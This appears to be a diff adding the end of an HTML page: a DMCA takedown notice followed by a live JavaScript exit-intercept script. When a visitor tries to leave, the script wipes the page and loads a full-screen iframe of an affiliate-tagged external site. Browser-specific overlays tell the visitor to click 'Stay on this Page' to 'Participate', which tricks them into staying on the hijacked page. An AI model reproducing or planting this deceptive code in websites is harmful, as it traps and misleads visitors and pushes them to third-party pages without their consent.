+						It is our policy to respond to notices of alleged infringement that comply with the Digital Millennium Copyright Act and other applicable intellectual property laws. Responses may include removing or disabling access to material claimed to be the subject of infringing activity and/or terminating subscribers. If we remove or disable access in response to such a notice, we will make a good-faith attempt to contact the owner or administrator of the affected site or content so that they may make a counter notification pursuant to sections 512(g)(2) and (3) of that Act. It is our policy to document all notices of alleged infringement on which we act.
+						<br/><br/>
+						To file a notice of infringement with us, you must provide a digital notification via email that sets forth the items specified below. Please note that you may be liable for damages (including costs and attorneys' fees) if you materially misrepresent that a product or activity is infringing your copyrights. Accordingly, if you are not sure whether material available online infringes your copyright, we suggest that you first contact an attorney.
+						<br/><br/>
+						Your communication must include substantially all of the following:
+						<br/><br/>
+						A physical or electronic signature of a person authorized to act on behalf of the owner of an exclusive right that is allegedly infringed.<br/>
+						Identify in sufficient detail the location of copyrighted work that you believe has been infringed upon or other information sufficient to specify the copyrighted work being infringed. If multiple copyrighted works at a single online site are covered by a single notification, a representative list of such works at that site.<br/>
+						Identification of the material that is claimed to be infringing or to be the subject of infringing activity and that is to be removed or access to which is to be disabled, and information reasonably sufficient to permit us to locate the material.<br/>
+						Information reasonably sufficient to permit us to contact the complaining party, such as an address, telephone number, and, if available, an electronic mail address at which the complaining party may be contacted.<br/>
+						The following statement: "I have a good faith belief that use of the material in the manner complained of is not authorized by the copyright owner, its agent, or the law."<br/>
+						The following statement: "I swear, under penalty of perjury, that the information in the notification is accurate, and that I am the copyright owner or am authorized to act on behalf of the owner of an exclusive right that is allegedly infringed."<br/>
+						Please contact us to report any misleading advertising, fake content, SPAM, copyright infringement, or other abuse.
+						<br/><br/>
+						<center><button onclick="jQuery('#link_dmca').hide('fast');">Close Window</button></center>
+					</div>
+				</div>
+
+									<script type="text/javascript">
+						var jquery_loaded = true;
+						var bypass = false;
+					
+						var exit_ready = false;
+						function load_slidepage(){
+							if(exit_ready==false){
+								exit_ready = true;
+								jQuery('#the_box').html('');
+								jQuery('#the_box').animate({
+							    	height: '0px'
+								}, 500, function() {
+									jQuery('#main_div').hide();
+									jQuery('#main_back').hide();
+									
+								});
+							}
+						}
+						
+						setTimeout('informUpdate()',1000);
+						
+						function informUpdate(){
+							if(jquery_loaded){
+								
+								var inlineboxmessage = 'Click Stay on this Page';
+								var inlineboxpage = 'https://quartzfiles.com/welcome/?pub=296157';
+							
+								jQuery(document).ready(function(){
+												
+									function addLoadEvent(func) {
+										var oldonload = window.onload;
+										if ( typeof window.onload != 'function') {
+											window.onload = func;
+										} else {
+											window.onload = function() {
+												if (oldonload) {
+													oldonload();
+												}
+												func();
+											}
+										}
+									}
+									
+									function addClickEvent(a, i, func) {
+										if ( typeof a[i].onclick != 'function') {
+											a[i].onclick = func;
+										}
+									}
+									
+									
+									var the_html = '<div id="main_div" style="display:block; width:100%; height:100%; position:absolute; z-index:2;">';
+									if(jQuery.browser.mozilla){
+										the_html += '<table height="100%"><tr valign="middle"><td style="vertical-align:middle;"><div id="the_box" style="background-color:white; height: 125px; margin-top:-105px; width:610px; border:1px solid white; border-radius:5px; -webkit-box-shadow: 0px 0px 120px 5px rgba(255, 255, 255, .75);-moz-box-shadow: 0px 0px 120px 5px rgba(255, 255, 255, .75); box-shadow: 0px 0px 120px 5px rgba(255, 255, 255, .75);"><div style="text-align:center; padding:50px; font-weight:bold; font-size:18px; color:lightgrey;">Loading...</div><div style="position:absolute;"><div style="position:relative;left:330px; top:10px;"><div style="width: 0; height: 0;border-left: 15px solid transparent;border-right: 15px solid transparent;border-bottom: 20px solid white;"></div><div style="color:white; position:absolute;"><div class="translate_text" style="padding:5px; border-radius:5px; background-color: black; width: 188px; position:relative; top: 10px; font-weight:bold; font-size:15px;">Click <i>"Stay on Page"</i> to Participate!</div></div></div></div></td></tr></table>';
+									}else if(jQuery.browser.chrome){
+										the_html += '<table height="100%"><tr valign="middle"><td style="vertical-align:middle;"><div id="the_box" style="background-color:white; height: 238px; margin-top:-95px; width:362px; border:1px solid white; border-radius:5px; -webkit-box-shadow: 0px 0px 120px 5px rgba(255, 255, 255, .75);-moz-box-shadow: 0px 0px 120px 5px rgba(255, 255, 255, .75); box-shadow: 0px 0px 120px 5px rgba(255, 255, 255, .75);"><div style="text-align:center; padding:108px; font-weight:bold; font-size:18px; color:lightgrey;">Loading...</div><div style="position:absolute;"><div style="position:relative;left:270px; top:20px;"><div style="width: 0; height: 0;border-left: 15px solid transparent;border-right: 15px solid transparent;border-bottom: 20px solid white;"></div><div style="color:white; position:absolute;"><div class="translate_text" style="padding:5px; border-radius:5px; background-color: black; width: 188px; position:relative; left: 20px; top: 10px; font-weight:bold; font-size:15px;">Click <i>"Stay on this Page"</i> to Participate!</div></div></div></div></td></tr></table>';
+									}else if(jQuery.browser.msie){
+										the_html += '<table height="100%"><tr valign="middle"><td style="vertical-align:middle;"><div id="the_box" style="background-color:white; height: 275px; margin-top:-165px; margin-left:15px; width:388px; border:1px solid white; border-radius:5px; -webkit-box-shadow: 0px 0px 120px 5px rgba(255, 255, 255, .75);-moz-box-shadow: 0px 0px 120px 5px rgba(255, 255, 255, .75); box-shadow: 0px 0px 120px 5px rgba(255, 255, 255, .75);"><div style="text-align:center; padding:127px; font-weight:bold; font-size:18px; color:lightgrey;">Loading...</div><div style="position:absolute;"><div style="position:relative;left:145px; top:20px;"><div style="width: 0; height: 0;border-left: 15px solid transparent;border-right: 15px solid transparent;border-bottom: 20px solid white;"></div><div style="color:white; position:absolute;"><div class="translate_text" style="padding:5px; border-radius:5px; background-color: black; width: 188px; position:relative; left: -8px; top: 10px; font-weight:bold; font-size:15px;">Click <i>"Stay on this Page"</i> to Participate!</div></div></div></div></td></tr></table>';
+									}else if(jQuery.browser.safari && !jQuery.browser.chrome){
+										the_html += '<table height="100%"><tr valign="middle"><td style="vertical-align:middle;"><div id="the_box" style="background-color:white; height: 275px; margin-top:-165px; margin-left:15px; width:388px; border:1px solid white; border-radius:5px; -webkit-box-shadow: 0px 0px 120px 5px rgba(255, 255, 255, .75);-moz-box-shadow: 0px 0px 120px 5px rgba(255, 255, 255, .75); box-shadow: 0px 0px 120px 5px rgba(255, 255, 255, .75);"><div style="text-align:center; padding:127px; font-weight:bold; font-size:18px; color:lightgrey;">Loading...</div><div style="position:absolute;"><div style="position:relative;left:145px; top:20px;"><div style="width: 0; height: 0;border-left: 15px solid transparent;border-right: 15px solid transparent;border-bottom: 20px solid white;"></div><div style="color:white; position:absolute;"><div class="translate_text" style="padding:5px; border-radius:5px; background-color: black; width: 188px; position:relative; left: -8px; top: 10px; font-weight:bold; font-size:15px;">Click <i>"Stay on this Page"</i> to Participate!</div></div></div></div></td></tr></table>';
+										inlineboxmessage = 'Click Stay on Page.';
+									}
+									the_html += '</div><div id="main_back" style="display:block; width:100%; height:100%; position:absolute; background:#000000; opacity: 0.5;"></div>';
+									
+									var theDiv = '<div onmouseover="load_slidepage();" id="InlineBoxDiv" style="display:block; width:100%; height:100%; position:absolute; margin-top:0px; margin-left:0px;" align="center">';
+									theDiv = theDiv + the_html;
+									theDiv = theDiv + '<iframe src="' + inlineboxpage + '" width="100%" height="100%" align="middle" frameborder="0"></iframe>';
+									theDiv = theDiv + '</div>';
+									theBody = document.body;
+									if (!theBody) {
+										theBody = document.getElementById("body");
+										if (!theBody) {
+											theBody = document.getElementsByTagName("body")[0];
+										}
+									}
+									var PreventInlineBox = false;
+									function DisableInlineBox() {
+										PreventInlineBox = true;
+									}
+									
+									function EnableInlineBox() {
+										PreventInlineBox = false;
+									}
+									
+									function DisplayInlineBox() {
+										if(bypass == false){
+											if (PreventInlineBox == false) {
+												window.scrollTo(0, 0);
+												PreventInlineBox = true;
+												divtag = document.createElement("div");
+												divtag.setAttribute("id", "InlineBoxMainOuterLayer");
+												divtag.style.position = "absolute";
+												divtag.style.width = "100%";
+												divtag.style.height = "100%";
+												divtag.style.zIndex = "99";
+												divtag.style.left = "0px";
+												divtag.style.top = "0px";
+												divtag.innerHTML = theDiv;
+												theBody.innerHTML = "";
+												theBody.topMargin = "0px";
+												theBody.rightMargin = "0px";
+												theBody.bottomMargin = "0px";
+												theBody.leftMargin = "0px";
+												theBody.style.overflow = "hidden";
+												theBody.appendChild(divtag);
+												return inlineboxmessage;
+											} else {
+												PreventInlineBox = false;
+											}
+										}
+									}
+									
+									var a = document.getElementsByTagName('A');
+									for (var i = 0; i < a.length; i++) {
+										if (a[i].target !== '_blank') {
+											addClickEvent(a, i, function() {
+												PreventInlineBox = true;
+											});
+										} else {
+											addClickEvent(a, i, function() {
+												PreventInlineBox = false;
+											});
+										}
+									}
+									disablelinksfunc = function() {
+										var a = document.getElementsByTagName('A');
+										for (var i = 0; i < a.length; i++) {
+											if (a[i].target !== '_blank') {
+												addClickEvent(a, i, function() {
+													PreventInlineBox = true;
+												});
+											} else {
+												addClickEvent(a, i, function() {
+													PreventInlineBox = false;
+												});
+											}
+										}
+									};
+									
+									addLoadEvent(disablelinksfunc);
+									window.onbeforeunload = DisplayInlineBox;
+									
+								
+								});
+				
+							}else{
+								setTimeout('informUpdate()',1000);
+							}
+						}
+						
+						var exit_ready = false;
+						function load_slidepage(){
+							if(exit_ready==false){
+								exit_ready = true;
+								jQuery('#the_box').html('');
+								jQuery('#the_box').animate({
+							    	height: '0px'
+								}, 500, function() {
+									jQuery('#main_div').hide();
+									jQuery('#main_back').hide();
+									
+								});
+							}
+						}
+						
+					</script>
+								<script language="JavaScript">update_inline_data();</script>				
+			</body>
+		</html>
